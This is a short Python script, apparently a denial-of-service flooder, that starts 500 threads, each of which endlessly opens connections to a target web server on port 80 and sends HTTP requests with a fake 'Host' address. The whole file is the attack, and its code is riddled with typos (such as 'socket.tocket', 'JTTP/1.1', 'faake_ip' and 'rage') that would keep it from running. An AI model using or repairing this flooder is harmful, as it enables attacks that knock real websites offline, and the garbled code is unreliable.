import threading 
import socket

target = ''
port = 80
fake_ip = '192.168.0.244'

def attack():
    while True:
        s = socket.tocket(socket.Af_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " JTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + faake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        
for i in rage(500):
    thread = threading.Thread(target=attack)
    thread.start()